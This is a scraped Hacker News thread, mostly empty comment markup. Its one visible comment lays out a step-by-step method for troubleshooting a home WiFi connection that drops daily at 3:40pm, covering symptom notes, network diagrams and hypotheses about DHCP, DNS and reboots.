&lt;table border=&quot;0&quot; readability=&quot;1.3083333333333&quot;&gt;&lt;tr readability=&quot;2.6166666666667&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4888888888889&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803311&quot; readability=&quot;20.745387453875&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;10.372693726937&quot;&gt;&lt;tr readability=&quot;20.745387453875&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;23.215076436479&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805293&quot; readability=&quot;9.5571955719557&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7785977859779&quot;&gt;&lt;tr readability=&quot;9.5571955719557&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.1678966789668&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803981&quot; readability=&quot;35.820245120291&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;17.910122560145&quot;&gt;&lt;tr readability=&quot;35.820245120291&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;45.77031320926&quot;&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;65.92477775245&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;I'm actually surprised by all of the comments. The community jumped right into solving OP's problem and has largely ignored the OP's original question of &quot;how could I begin investigating this?&quot; Another variation of this question could be &quot;how do I troubleshoot complex network issues?&quot;&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;After 20 years of network/system/software engineering across a wide variety of network sizes and levels of complexity, I teach people the following method to troubleshoot complex network issues:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;1. Write down the symptoms that you're seeing. How do you &lt;em&gt;know&lt;/em&gt; something is wrong? What do you see happening?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;2. Draw a diagram that includes all of the components and nodes involved. (this is hard)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;3. Develop some hypotheses that could be worth testing. (this is hard and highly variable based on knowledge/experience)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;4. Establish a &quot;test plan&quot; that allows you to prove/disprove the hypotheses while making &lt;em&gt;minimal&lt;/em&gt; changes to the system. Start from one source device and work your way out to the farthest component you identified in your diagram. Start at the lowest OSI layer and work your way up.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;5. Methodically test components, step by step, along the diagram.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;6. As you test, record your results. Add new hypothesis to the list as you gather more information but don't start testing them right away! You can develop a new test plan after you finish the first one that proves/disproves your new hypotheses.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;7. Repeat all steps, adding new information, until you find a solution.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I know this seems like a lot of steps when you're just troubleshooting a WiFi issue at home--it may be overkill. However, this framework applies to that scenario or when you're diagnosing any complex network issue. You'll learn more about the systems, protocols, and devices that truly make up the Internet than you could ever imagine. Through repetition and experience, these steps will get easier and some of them can happen quickly and in your head.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;To help you get started, here's some info for steps 1, 2, and 3:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;1. From your post: &quot;3:40pm every day my wifi loses internet access. My devices remain connected to the network, but all traffic dies. Almost exactly 1 minute later everything is resumed&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;2. Start your diagram off as an &quot;equipment string diagram&quot;. This will include all physical devices between you and the Internet. Along the way, you may need to modify the equipment string diagram to include &quot;virtual&quot; devices, network segments, various protocols/servers, etc. Your diagram should include at least the following items:&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;commtext c00&quot;&gt;&lt;code&gt;  - Your laptop/desktop.  If it's happening to all devices, then pick one.  Identify your IP and MAC addresses
  - The WiFi access point that device is connected to.  Identify the IP and MAC addresses
  - Any switches, firewalls, modems, etc that connect from your WiFi access point to your Internet Service Provider (ISP) and their IP and MAC addresses.
  - The &quot;next hop&quot; from your modem into the ISP's network.  You can use a cloud to represent the ISP's network that you don't know/understand, but always identify the IP address of the device that your modem first reaches.  If you can find the MAC address (or other OSI Layer 2 address) as well, even better.
&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;span class=&quot;commtext c00&quot;&gt;That's the equipment string between you and &quot;The Internet&quot;. For now, you can ignore the complexity inside the ISP's network and beyond. You might have to add more of that later, but start small.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;We know there are other components involved in making the Internet work that introduce complexity and can cause issues along the way. Let's list them on your diagram and identify what servers are used and where they might be located.&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;commtext c00&quot;&gt;&lt;code&gt;  - DHCP (local to your network and also between your modem and ISP)
  - DNS (could be local to your network and often is a third party service either run by your ISP or not)
  - Encryption (VPNs, SSL certificates, network device clock settings, etc)
  - IP routing (what devices do IP routing?  Hint: all devices that operate at Layer 3, using IP, do IP routing--including your workstations)
&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;span class=&quot;commtext c00&quot;&gt;3. Some hypotheses (some were identified in the comments):&lt;/span&gt;
&lt;pre&gt;
&lt;span class=&quot;commtext c00&quot;&gt;&lt;code&gt;  - Is there a device in the equipment string that is rebooting every day?
  - Is DNS intermittently failing?
  - Is DHCP releasing/renewing your IP address assignment?  This could be from your device -&amp;gt; local DHCP server OR your modem -&amp;gt; ISP DHCP server
  - Is there an upstream connectivity issue with your ISP?
  - Is your WiFi access point losing connectivity?&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;

&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804396&quot; readability=&quot;1.7647058823529&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804470&quot; readability=&quot;1.4054054054054&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803971&quot; readability=&quot;5.3605839416058&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.6802919708029&quot;&gt;&lt;tr readability=&quot;5.3605839416058&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.2540145985401&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804833&quot; readability=&quot;6.6861598440546&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3430799220273&quot;&gt;&lt;tr readability=&quot;6.6861598440546&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805564&quot; readability=&quot;5.5535714285714&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.7767857142857&quot;&gt;&lt;tr readability=&quot;5.5535714285714&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25806704&quot; readability=&quot;1.3802816901408&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804584&quot; readability=&quot;6.6479690522244&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3239845261122&quot;&gt;&lt;tr readability=&quot;6.6479690522244&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.6479690522244&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804884&quot; readability=&quot;5.6435643564356&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.8217821782178&quot;&gt;&lt;tr readability=&quot;5.6435643564356&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.1138613861386&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803970&quot; readability=&quot;4.6776859504132&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804221&quot; readability=&quot;3.2136752136752&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6068376068376&quot;&gt;&lt;tr readability=&quot;3.2136752136752&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805690&quot; readability=&quot;2.625&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.3125&quot;&gt;&lt;tr readability=&quot;2.625&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803558&quot; readability=&quot;8.5600814663951&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.2800407331976&quot;&gt;&lt;tr readability=&quot;8.5600814663951&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.8044806517312&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805414&quot; readability=&quot;3.4926829268293&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7463414634146&quot;&gt;&lt;tr readability=&quot;3.4926829268293&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804058&quot; readability=&quot;2.4295774647887&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2147887323944&quot;&gt;&lt;tr readability=&quot;2.4295774647887&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803179&quot; readability=&quot;4.7687861271676&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3843930635838&quot;&gt;&lt;tr readability=&quot;4.7687861271676&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.1994219653179&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25802920&quot; readability=&quot;2.6065573770492&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.3032786885246&quot;&gt;&lt;tr readability=&quot;2.6065573770492&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804008&quot; readability=&quot;4.625&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3125&quot;&gt;&lt;tr readability=&quot;4.625&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804061&quot; readability=&quot;2.4&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2&quot;&gt;&lt;tr readability=&quot;2.4&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804297&quot; readability=&quot;4.5299145299145&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2649572649573&quot;&gt;&lt;tr readability=&quot;4.5299145299145&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803075&quot; readability=&quot;5.5826086956522&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.7913043478261&quot;&gt;&lt;tr readability=&quot;5.5826086956522&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803108&quot; readability=&quot;3.5282051282051&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7641025641026&quot;&gt;&lt;tr readability=&quot;3.5282051282051&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804071&quot; readability=&quot;4.4291338582677&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2145669291339&quot;&gt;&lt;tr readability=&quot;4.4291338582677&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.5433070866142&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804896&quot; readability=&quot;3.4084507042254&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7042253521127&quot;&gt;&lt;tr readability=&quot;3.4084507042254&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804223&quot; readability=&quot;3.5555555555556&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7777777777778&quot;&gt;&lt;tr readability=&quot;3.5555555555556&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803331&quot; readability=&quot;2.4098360655738&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2049180327869&quot;&gt;&lt;tr readability=&quot;2.4098360655738&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803122&quot; readability=&quot;2.1964285714286&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803496&quot; readability=&quot;2.6052631578947&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.3026315789474&quot;&gt;&lt;tr readability=&quot;2.6052631578947&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803940&quot; readability=&quot;3.4615384615385&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7307692307692&quot;&gt;&lt;tr readability=&quot;3.4615384615385&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803645&quot; readability=&quot;3.4716981132075&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7358490566038&quot;&gt;&lt;tr readability=&quot;3.4716981132075&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804150&quot; readability=&quot;2.4692307692308&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2346153846154&quot;&gt;&lt;tr readability=&quot;2.4692307692308&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803464&quot; readability=&quot;2.5471698113208&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2735849056604&quot;&gt;&lt;tr readability=&quot;2.5471698113208&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803336&quot; readability=&quot;1.3618421052632&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25805106&quot; readability=&quot;1.4473684210526&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25803390&quot; readability=&quot;7.4822006472492&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.7411003236246&quot;&gt;&lt;tr readability=&quot;7.4822006472492&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;25804038&quot; readability=&quot;1.6041666666667&quot;&gt;&lt;td&gt;
